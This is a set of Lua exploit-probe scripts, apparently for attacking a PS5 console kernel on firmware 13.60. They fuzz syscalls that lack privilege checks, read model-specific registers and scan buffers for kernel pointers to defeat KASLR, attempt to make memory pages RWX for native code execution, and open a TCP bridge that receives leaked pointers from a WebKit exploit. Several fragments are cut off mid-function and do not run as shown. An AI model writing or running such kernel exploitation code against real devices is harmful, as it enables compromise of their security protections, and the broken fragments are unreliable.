-- PROBE 54a: Test sys 626 for direct RDMSR access
--
-- Context: Verified handler analysis found 39 RDMSR opcodes in the sys 626
-- handler with no priv_check in the 13.60 binary. RDMSR reads CPU
-- model-specific registers. If accessible, could leak kernel state,
-- timing info, or addresses useful for KASLR defeat.
--

-- - TSC (0x10): timestamp counter
-- - APIC_BASE (0x1B): local APIC physical address
-- - SYSENTER_EIP (0x176): kernel entry point address (KASLR gold)
-- - EFER (0xC0000080): extended feature enable
-- - STAR (0xC0000081): syscall target address
-- - LSTAR (0xC0000082): long mode syscall entry (KASLR gold)
-- - CSTAR (0xC0000083): compat mode syscall entry
-- - SFMASK (0xC0000084): syscall flag mask
-- - FS_BASE (0xC0000100): FS segment base
-- - GS_BASE (0xC0000101): GS segment base
-- - KERNEL_GS_BASE (0xC0000102): kernel GS base (KASLR gold)

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}

    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
```

```lua
-- Reverse the pointer obfuscation: f(x) = x ^ (x >> 4)
-- Since SAR preserves sign and top bits are stable, we recover nibble-by-nibble
-- from MSB down: top 4 bits are clear, then each next nibble is XOR'd with
-- the nibble above it (already recovered).
local function deobfuscate_ptr(h, l)
    -- Work with two 32-bit halves
    -- The transform is: out = val ^ (val >>> 4) [arithmetic shift]
    -- To reverse: val[63:60] = out[63:60] (top nibble unchanged by sar 4)
    -- Then for each nibble i from 59:56 down to 3:0:
    --   val[nibble_i] = out[nibble_i] ^ val[nibble_i+1]

    -- Combine into a single number representation
    -- Since Lua 5.1 lacks 64-bit integers, work nibble by nibble on h and l
    local function get_nibble(hi, lo, pos)
        -- pos 0 = lowest nibble of lo, pos 15 = highest nibble of hi
        if pos < 8 then
            local shift = pos * 4
            local mask = 0xF
            return math.floor(lo / (2^shift)) % 16
        else
            local shift = (pos - 8) * 4
            return math.floor(hi / (2^shift)) % 16
        end
    end

    local function set_nibble(hi, lo, pos, val)
        if pos < 8 then
            local shift = pos * 4
            local p = 2^shift
            lo = lo - (math.floor(lo / p) % 16) * p + val * p
        else
            local shift = (pos - 8) * 4
            local p = 2^shift
            hi = hi - (math.floor(hi / p) % 16) * p + val * p
        end
        return hi, lo
    end

    -- Extract obfuscated nibbles
    local ob = {}
    for i = 0, 15 do
        ob[i] = get_nibble(h, l, i)
    end

    -- Recover original nibbles top-down
    local orig = {}
    orig[15] = ob[15]  -- top nibble unchanged (SAR keeps sign bits)
    for i = 14, 0, -1 do
        -- The SAR by 4 means nibble i of (val>>4) = nibble i+1 of val
        -- So obfuscated[i] = original[i] XOR original[i+1]
        -- But for arithmetic shift, the sign extension fills from top
        -- For negative (kernel) pointers, top nibble is 0xF, SAR fills with F
        -- Actually: nibble i of (x SAR 4) = nibble (i+1) of x, for i < 15
        -- And nibble 15 of (x SAR 4) = nibble 15 of x (sign preserved)
        local xor_val = orig[i + 1]
        -- XOR to recover: original[i] = obfuscated[i] XOR original[i+1]
        local bxor = 0
        local a, b = ob[i], xor_val
        for bit = 0, 3 do
            local p = 2^bit
            local ba = math.floor(a / p) % 2
            local bb = math.floor(b / p) % 2
            if ba ~= bb then bxor = bxor + p end
        end
        orig[i] = bxor
    end

    -- Reconstruct hi/lo
    local rh, rl = 0, 0
    for i = 0, 15 do
        rh, rl = set_nibble(rh, rl, i, orig[i])
    end
    return rh, rl
end
```

```lua
-- CRASH_CLASS: MODERATE
-- PROBE 54d: Test sys 588 DMEM page attribute modification
--
-- Context: Static analysis of 13.60 handler confirms NO priv_check.
-- Handler expects: arg[0] = DMEM start address, arg[1] = length, arg[2] = pointer to 0x20-byte struct
-- It does bounds checks against a DMEM region object, page-aligns, copyin's the struct,
-- then calls the page attribute setter. If we can change DMEM page attrs to RWX or W->X,
-- combined with GPU mmap heap R/W, we get native code execution.
--
-- The handler also checks: upper bits of start addr (shifted right 0x28, compared to 0xE),
-- and that aligned_end >= 0x80000000001.
-- It calls copyin(arg[2], stack_buf, 0x20) then calls the setter.

print("=== PROBE 54d: DMEM PAGE ATTRIBUTE MODIFICATION ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

local sc588 = make_syscall(588)
local sc585 = make_syscall(585) -- mtype_protect, confirmed returning 0

-- Phase 1: First test sys 585 (mtype_protect) to confirm it still works
print("[*] Phase 1: Confirm sys 585 (mtype_protect) baseline")
do
    local ok, ret = pcall(function()
        return sc585(uint64(0), uint64(0x4000), uint64(3))
    end)
    if ok then
        print("  585(0, 0x4000, 3) = " .. signed32(ret))
    else
        print("  585 CRASHED: " .. tostring(ret))
    end
end
print("")

-- Phase 2: Probe sys 588 with various arguments
-- From binary: arg[0]=start_addr, arg[1]=length, arg[2]=ptr_to_struct(0x20 bytes)
print("[*] Phase 2: Testing sys 588 argument patterns")
print("")

local attr_struct = memory.alloc(0x40)

-- Zero struct
for i = 0, 0x3F, 4 do safe_wd(attr_struct + i, 0) end

-- Test 2a: all zeros
print("  Test 2a: 588(0, 0x4000, &zeroed_struct)")
do
    local ok, ret = pcall(function()
        return sc588(uint64(0), uint64(0x4000), uint64(attr_struct))
    end)
    if ok then
        print("    ret = " .. signed32(ret) .. " (" .. hexval(ret) .. ")")
    else
        print("    CRASHED: " .. tostring(ret))
    end
end

-- Test 2b: GPU mmap address as start (we know GPU mmap works)
print("")
print("  Allocating GPU mmap region first...")
local sc_mmap = make_syscall(477)
local gpu = nil
do
    local ok, val = pcall(function()
        return sc_mmap(uint64(0), uint64(16*0x4000), uint64(0x33), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if ok then
        gpu = val
        print("    GPU mmap at: " .. hexval(gpu))
    else
        print("    GPU mmap FAILED: " .. tostring(val))
    end
end

if gpu then
    -- Try to change attrs on the GPU mmap region
    local gpu_h, gpu_l = get_hi_lo(gpu)

    -- Try different protection values in the struct
    -- FreeBSD DMEM attrs might follow VM_PROT_xxx: READ=1, WRITE=2, EXEC=4
    local prot_tests = {
        {0x07, "RWX (7)"},
        {0x05, "RX (5)"},
        {0x04, "X only (4)"},
        {0x33, "0x33 (mmap prot)"},
        {0x37, "0x37 (mmap prot|EXEC)"},
    }

    for _, pt in ipairs(prot_tests) do
        local protval = pt[1]
        local desc = pt[2]

        for i = 0, 0x1F, 4 do safe_wd(attr_struct + i, 0) end
        safe_wd(attr_struct, protval) -- try prot at offset 0
        safe_wd(attr_struct + 4, 0)

        print(string.format("\n  Test: 588(gpu_addr, 0x4000, &{prot=%s})", desc))
        local ok, ret = pcall(function()
            return sc588(gpu, uint64(0x4000), uint64(attr_struct))
        end)
        if ok then
            local rv = signed32(ret)
            print("    ret = " .. rv)
            if rv == 0 then
                print("    >>> SUCCESS! Page attrs may have changed")
                -- Test if we can now execute from this region
                -- Write a RET instruction (0xC3) and try to jump
                print("    (Cannot test execution without a jump primitive)")
            end
        else
            print("    CRASHED: " .. tostring(ret))
        end
    end

    -- Also try with struct prot at different offsets
    print("\n  Testing struct layout variations:")
    for offset = 0, 0x18, 8 do
        for i = 0, 0x1F, 4 do safe_wd(attr_struct + i, 0) end
        safe_wd(attr_struct + offset, 0x07) -- RWX at this offset

        local ok, ret = pcall(function()
            return sc588(gpu, uint64(0x4000), uint64(attr_struct))
        end)
        if ok then
            print(string.format("    struct[+%d]=7 -> ret=%d", offset, signed32(ret)))
        else
            print(string.format("    struct[+%d]=7 -> CRASHED", offset))
        end
    end
end

-- Phase 3: Try sys 588 with DMEM-style addresses
-- DMEM physical addresses start at high ranges
-- The handler checks upper_bits = addr >> 0x28, must be <= 0xE
print("\n[*] Phase 3: DMEM-range address tests")
local dmem_addrs = {
    {0x00, 0x00000000, "0x0"},
    {0x01, 0x00000000, "0x100000000"},
    {0x0E, 0x00000000, "0xE00000000 (max zone)"},
    {0x00, 0x80000000, "0x80000000"},
}
for _, da in ipairs(dmem_addrs) do
    local hi = da[1]
    local lo = da[2]
    local desc = da[3]

    for i = 0, 0x1F, 4 do safe_wd(attr_struct + i, 0) end
    safe_wd(attr_struct, 0x07)

    local addr_str = string.format("0x%X%08X", hi, lo)
    local addr_u64 = uint64(addr_str)

    local ok, ret = pcall(function()
        return sc588(addr_u64, uint64(0x4000), uint64(attr_struct))
    end)
    if ok then
        print(string.format("  588(%s, 0x4000, &struct) = %d", desc, signed32(ret)))
    else
        print(string.format("  588(%s, 0x4000, &struct) CRASHED: %s", desc, tostring(ret)))
    end
end

print("")
print("=== PROBE 54d COMPLETE ===")
```

```lua
-- CRASH_CLASS: MODERATE
-- PROBE 54e: Smart fuzz sys 622 device control multiplexer
--
-- Binary analysis of 13.60 handler at offset 0x7dcd40:
--   - Reads 6 args from struct
--   - Checks arg[4] (r12) > 0x40
--   - Does copyin from arg[3] into stack variable
--   - Short handler with early return paths
--   - narg=6 in sysent
--
-- Strategy: arg[4] is a size/type check (must be > 0x40).
-- arg[3] is a user buffer pointer that gets copyin'd.
-- arg[0] might be a device handle/fd, arg[1] a command code.
-- This looks like an ioctl-style multiplexer.

print("=== PROBE 54e: SYS 622 DEVICE CONTROL FUZZ ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

local sc622 = make_syscall(622)
local inbuf = memory.alloc(0x200)   -- copyin source buffer
local outbuf = memory.alloc(0x200)  -- potential output

-- Phase 1: Basic arg exploration
-- arg[4] must be > 0x40, so use 0x80 as a safe size
print("[*] Phase 1: Argument pattern exploration")
print("    arg layout: 622(a0, a1, a2, inbuf_ptr, size, a5)")
print("")

-- Zero buffers
for i = 0, 0x1FF, 4 do safe_wd(inbuf + i, 0) end
for i = 0, 0x1FF, 4 do safe_wd(outbuf + i, 0) end

-- Test with various arg0 values (might be device handle)
local a0_tests = {0, 1, 2, 3, 4, 5, 0xFF, 0xFFFFFFFF}
for _, a0 in ipairs(a0_tests) do
    local a0_u64
    if a0 >= 0x80000000 then
        a0_u64 = uint64(string.format("0x%X", a0))
    else
        a0_u64 = uint64(a0)
    end

    local ok, ret = pcall(function()
        return sc622(a0_u64, uint64(0), uint64(0), uint64(inbuf), uint64(0x80), uint64(0))
    end)
    if ok then
        print(string.format("  a0=0x%X  ret=%d", a0, signed32(ret)))
    else
        print(string.format("  a0=0x%X  CRASHED: %s", a0, tostring(ret)))
    end
end
print("")

-- Phase 2: Try with arg[4] below and above the 0x40 threshold
print("[*] Phase 2: arg[4] size threshold test (handler checks > 0x40)")
print("")
for _, sz in ipairs({0, 0x20, 0x3F, 0x40, 0x41, 0x80, 0x100, 0x200}) do
    local ok, ret = pcall(function()
        return sc622(uint64(0), uint64(0), uint64(0), uint64(inbuf), uint64(sz), uint64(0))
    end)
    if ok then
        local rv = signed32(ret)
        print(string.format("  size=0x%X  ret=%d%s", sz, rv,
            rv ~= signed32(sc622 and -1 or 0) and "" or ""))
        if rv == 0 then
            print("  >>> SUCCESS at size 0x" .. string.format("%X", sz))
        end
    else
        print(string.format("  size=0x%X  CRASHED: %s", sz, tostring(ret)))
    end
end
print("")

-- Phase 3: arg[1] as command code (ioctl-style)
print("[*] Phase 3: arg[1] command code sweep")
print("")
for cmd = 0, 31 do
    for i = 0, 0x7F, 4 do safe_wd(inbuf + i, 0) end

    local ok, ret = pcall(function()
        return sc622(uint64(0), uint64(cmd), uint64(0), uint64(inbuf), uint64(0x80), uint64(0))
    end)
    if ok then
        local rv = signed32(ret)
        if rv ~= -1 then
            print(string.format("  cmd=%2d  ret=%d  <<< NON-ERROR", cmd, rv))
        else
            print(string.format("  cmd=%2d  ret=%d", cmd, rv))
        end
    else
        print(string.format("  cmd=%2d  CRASHED: %s", cmd, tostring(ret)))
    end
end
print("")

-- Phase 4: arg[3] as inout buffer - fill with pattern, check after call
print("[*] Phase 4: Buffer modification test (does handler write back?)")
print("")
do
    -- Fill buffer with known pattern
    for i = 0, 0x7F, 4 do safe_wd(inbuf + i, 0x41414141 + i) end

    local ok, ret = pcall(function()
        return sc622(uint64(0), uint64(0), uint64(0), uint64(inbuf), uint64(0x80), uint64(0))
    end)

    if ok then
        print("  ret=" .. signed32(ret))
        -- Check if any bytes changed
        local changed = {}
        for i = 0, 0x7F, 4 do
            local expected = 0x41414141 + i
            local actual = safe_rd(inbuf + i)
            if actual and actual ~= expected then
                table.insert(changed, string.format("+%02X: 0x%08X->0x%08X", i, expected, actual))
            end
        end
        if #changed > 0 then
            print("  >>> BUFFER MODIFIED by handler:")
            for _, c in ipairs(changed) do print("    " .. c) end
        else
            print("  Buffer unchanged")
        end
    else
        print("  CRASHED: " .. tostring(ret))
    end
end
print("")

-- Phase 5: arg[5] exploration (6th argument)
print("[*] Phase 5: arg[5] (6th arg) variations")
print("")
for _, a5 in ipairs({0, 1, 2, 0x80, 0x100, 0xFFFFFFFF}) do
    local a5_u64
    if a5 >= 0x80000000 then
        a5_u64 = uint64(string.format("0x%X", a5))
    else
        a5_u64 = uint64(a5)
    end

    for i = 0, 0x7F, 4 do safe_wd(inbuf + i, 0) end

    local ok, ret = pcall(function()
        return sc622(uint64(0), uint64(0), uint64(0), uint64(inbuf), uint64(0x80), a5_u64)
    end)
    if ok then
        local rv = signed32(ret)
        -- Scan inbuf for kernel pointers
        local found_kptr = false
        for i = 0, 0x78, 8 do
            local q = safe_rq(inbuf + i)
            if q then
                local h, l = get_hi_lo(q)
                if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                    print(string.format("  a5=0x%X ret=%d  KPTR at +%d: %s", a5, rv, i, hexval(q)))
                    found_kptr = true
                end
            end
        end
        if not found_kptr then
            print(string.format("  a5=0x%X  ret=%d", a5, rv))
        end
    else
        print(string.format("  a5=0x%X  CRASHED: %s", a5, tostring(ret)))
    end
end
print("")

-- Phase 6: Use outbuf as arg[2] (maybe it's an output pointer)
print("[*] Phase 6: arg[2] as output buffer pointer")
print("")
for _, cmd in ipairs({0, 1, 2, 3}) do
    for i = 0, 0x7F, 4 do safe_wd(outbuf + i, 0xDEADBEEF) end
    for i = 0, 0x7F, 4 do safe_wd(inbuf + i, 0) end

    local ok, ret = pcall(function()
        return sc622(uint64(0), uint64(cmd), uint64(outbuf), uint64(inbuf), uint64(0x80), uint64(0))
    end)
    if ok then
        local rv = signed32(ret)
        local sentinel = (safe_rd(outbuf) == 0xDEADBEEF)
        if not sentinel then
            local q0 = safe_rq(outbuf)
            print(string.format("  cmd=%d  ret=%d  outbuf[0]=%s  <<< WRITTEN", cmd, rv, hexval(q0)))
            for i = 0, 0x78, 8 do
                local q = safe_rq(outbuf + i)
                if q then
                    local h, l = get_hi_lo(q)
                    if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                        print(string.format("  >>> KPTR at +%d: %s", i, hexval(q)))
                    end
                end
            end
        else
            print(string.format("  cmd=%d  ret=%d  outbuf unchanged", cmd, rv))
        end
    else
        print(string.format("  cmd=%d  CRASHED: %s", cmd, tostring(ret)))
    end
end

print("")
print("=== PROBE 54e COMPLETE ===")
```

```lua
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function safe_wb(addr, val)
    return pcall(function() memory.write_byte(addr, val % 256) end)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)

    local h, l = get_hi_lo(val)

            print(string.format("  >>> KPTR [%s+0x%03X]: %s", label, i, hexval(q)))
        end
    end
    return count

    local parts = {}

        if v then table.insert(parts, string.format("%08X", v))
        else table.insert(parts, "????????") end

    return string.format("  +%03X: %s", offset, table.concat(parts, " "))
```

```lua
-- CRASH_CLASS: LOW
-- PROBE 54h: Lua-side TCP bridge for WebKit coordination
--
-- Context: WebKit probes (54g) run in the browser and beacon results via HTTP.
-- This probe opens a TCP listener on the PS5 that WebKit can connect to via
-- fetch() or WebSocket, enabling real-time data exchange between the two
-- attack surfaces.
--
-- Flow:
-- 1. Lua opens a listening TCP socket on a low port (e.g. 8888)
-- 2. WebKit connects via fetch('http://localhost:8888/...')
-- 3. WebKit sends leaked addresses/pointers
-- 4. Lua parses them and uses make_syscall to attack the kernel
--

print("=== PROBE 54h: LUA-WEBKIT BRIDGE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

local sc_accept = make_syscall(30)    -- accept

local sc_write = make_syscall(4)      -- write
local sc_close = make_syscall(6)      -- close
local sc_setsockopt = make_syscall(105) -- setsockopt

    return sc_socket(uint64(2), uint64(1), uint64(0), uint64(0), uint64(0), uint64(0))
end)
if not ok then
    print("[-] socket() failed: " .. tostring(srv_fd))
    print("=== PROBE 54h FAILED ===")
    return
end
local srv = signed32(srv_fd)
print("[+] socket fd = " .. srv)

if srv < 0 then
    print("[-] socket returned error")
    print("=== PROBE 54h FAILED ===")
    return
end

-- SO_REUSEADDR
local optbuf = memory.alloc(8)
safe_wd(optbuf, 1)
pcall(function()
    sc_setsockopt(uint64(srv), uint64(0xFFFF), uint64(4), uint64(optbuf), uint64(4), uint64(0))
end)

-- bind to 0.0.0.0:8888
local PORT = 8888
local sa = memory.alloc(16)
safe_wd(sa, 0x0210)         -- sin_len=2, sin_family=AF_INET (little-endian struct)
-- Port 8888 = 0x22B8, network byte order
local port_hi = math.floor(PORT / 256)
local port_lo = PORT - port_hi * 256
safe_wd(sa, 0x0002 + port_hi * 0x10000 + port_lo * 0x1000000)  -- family + port (network order)
safe_wd(sa + 4, 0)          -- INADDR_ANY

local ok2, bind_ret = pcall(function()
    return sc_bind(uint64(srv), uint64(sa), uint64(16), uint64(0), uint64(0), uint64(0))
end)
if ok2 then
    print("[*] bind() = " .. signed32(bind_ret))
else
    print("[-] bind() failed: " .. tostring(bind_ret))
end

-- listen

    return sc_listen(uint64(srv), uint64(5), uint64(0), uint64(0), uint64(0), uint64(0))
end)
if ok3 then
    print("[*] listen() = " .. signed32(listen_ret))
else
    print("[-] listen() failed: " .. tostring(listen_ret))

print("")

local peer_len = memory.alloc(8)

    return sc_accept(uint64(srv), uint64(peer_sa), uint64(peer_len), uint64(0), uint64(0), uint64(0))
end)

    pcall(function() sc_close(uint64(srv), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
    print("=== PROBE 54h FAILED ===")

    print("[-] accept returned error: " .. cli)
    pcall(function() sc_close(uint64(srv), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
    print("=== PROBE 54h FAILED ===")
    return

            else

            end
        end

    print("[*] Request: " .. data:sub(1, 200))

    -- Parse pointer from URL: GET /leak?ptr=HEXVALUE HTTP/1.1
    local ptr_hex = data:match("ptr=(%x+)")
    if ptr_hex then
        print("[+] Received pointer from WebKit: 0x" .. ptr_hex)
        print("")

        -- Phase 3: Use the leaked pointer with syscalls

        -- If it's kernel-like, we have KASLR defeat

        local ptr_val = uint64("0x" .. ptr_hex)

            end)
```

```lua
--   six RDMSR sites for 0xC0010201..0xC001020B
--   one 8-byte copyout from the selected counter slot
-- sys 563/564 are the enable/disable counterparts. sys 565/566 configure PMCs.
-- These are performance-counter values, not expected kernel pointers.

print("=== PROBE 54i: SYS 567 PMC READ ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wq(addr, val)
    return pcall(function() memory.write_qword(addr, val) end)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

local sc20 = make_syscall(20)
local sc563 = make_syscall(563)
local sc564 = make_syscall(564)
local sc567 = make_syscall(567)
local outbuf = memory.alloc(0x1000)
local SENTINEL = uint64("0x4141414141414141")
local GUARD = uint64("0x4242424242424242")

local ok_pid, pid_ret = pcall(function() return sc20() end)
local pid = ok_pid and to_num(pid_ret) or 0
print("[*] PID: " .. pid)
if pid == 0 then
    print("[!] Valid PID required; stopping")
    return
end

local function call_simple(sc, num)
    local ok, ret = pcall(function()
        return sc(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    if ok then
        print(string.format("  sys %d(0) ret=%d", num, signed32(ret)))
        return signed32(ret)
    end
    print(string.format("  sys %d(0) pcall failed: %s", num, tostring(ret)))
    return nil
end

local function read_counter(index)
    safe_wq(outbuf, SENTINEL)
    safe_wq(outbuf + 8, GUARD)
    local ok, ret = pcall(function()
        return sc567(uint64(pid), uint64(index), uint64(outbuf),
            uint64(0), uint64(0), uint64(0))
    end)
    if not ok then
        print(string.format("  567(pid, %d, out) pcall failed: %s", index, tostring(ret)))
        return nil
    end
    local rv = signed32(ret)
    local value = safe_rq(outbuf)
    local guard = safe_rq(outbuf + 8)
    local vh, vl = get_hi_lo(value)
    local gh, gl = get_hi_lo(guard)
    local changed = not (vh == 0x41414141 and vl == 0x41414141)
    local guard_intact = gh == 0x42424242 and gl == 0x42424242
    print(string.format("  567(pid, %d, out) ret=%d value=%s changed=%s guard8_intact=%s",
        index, rv, hexval(value), tostring(changed), tostring(guard_intact)))
    return {rv=rv, value=value, changed=changed, guard=guard_intact}
end

print("[*] Baseline before explicit enable")
read_counter(0)
print("")

print("[*] Enable PMC for current process")
local enable_rv = call_simple(sc563, 563)
print("")

print("[*] Read all six counter slots twice")
for round = 1, 2 do
    print("  Round " .. round)
    for index = 0, 5 do read_counter(index) end
end
print("")

print("[*] Disable PMC for current process")
call_simple(sc564, 564)
print("")

print("[*] Post-disable check")
read_counter(0)
print("")
print("=== PROBE 54i COMPLETE ===")
```

```lua
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

    local outbuf = memory.alloc(bufsize + 64)
    for i = 0, bufsize - 1, 4 do safe_wd(outbuf + i, 0xDEADBEEF) end

    local ok, ret = pcall(function()
        return sc572(uint64(0), uint64(outbuf), uint64(bufsize), uint64(0), uint64(0), uint64(0))
    end)

    if ok then
        local rv = signed32(ret)
        print(string.format("  572(0, outbuf, %d) = %d", bufsize, rv))

                if qv then
                    local h, l = get_hi_lo(qv)
                    if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                        print(string.format("  >>> KPTR at +%d: %s", i, hexval(qv)))
                        kptr_count = kptr_count + 1
                    end
                    if h ~= 0xDEADBEEF and (h ~= 0 or l ~= 0) and l ~= 0xDEADBEEF then
                        local d0 = safe_rd(outbuf + i)
                        local d1 = safe_rd(outbuf + i + 4)
                        if d0 ~= 0xDEADBEEF or d1 ~= 0xDEADBEEF then
                            print(string.format("  DATA at +%d: %s", i, hexval(qv)))
                        end
                    end
                end
            end
            print(string.format("  Kernel pointers found: %d", kptr_count))
        end
    else
        print(string.format("  572(0, outbuf, %d) CRASHED: %s", bufsize, tostring(ret)))
    end
end
print("")

-- Phase 2: Try different arg0 values (command/subcommand?)

print("")
local outbuf2 = memory.alloc(4096)
for cmd = 0, 20 do
    for i = 0, 1023, 4 do safe_wd(outbuf2 + i, 0) end

    local ok, ret = pcall(function()
        return sc572(uint64(cmd), uint64(outbuf2), uint64(1024), uint64(0), uint64(0), uint64(0))
    end)

        if rv == 0 then
            for i = 0, 120, 8 do
                local qv = safe_rq(outbuf2 + i)
                if qv then
                    local h, l = get_hi_lo(qv)
                    if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                        print(string.format("  >>> KPTR at +%d: %s", i, hexval(qv)))
                    end
                end
            end
        end
    else
        print(string.format("  cmd=%2d  CRASHED: %s", cmd, tostring(ret)))
    end
end
print("")

-- Phase 3: Try outbuf as arg1 (different calling convention)
print("[*] Phase 3: 572(outbuf, size, 0...) and 572(outbuf, cmd, size...)")
print("")
for cmd = 0, 5 do
    for i = 0, 1023, 4 do safe_wd(outbuf2 + i, 0) end
    local ok, ret = pcall(function()
        return sc572(uint64(outbuf2), uint64(cmd), uint64(1024), uint64(0), uint64(0), uint64(0))
    end)
    if ok then

        local q0 = safe_rq(outbuf2)

                    if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                        print(string.format("  >>> KPTR at +%d: %s", i, hexval(qv)))
                    end
                end
            end
        end
    else
        print(string.format("  572(outbuf, %d, 1024) CRASHED: %s", cmd, tostring(ret)))

end

print("")
```

```lua
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
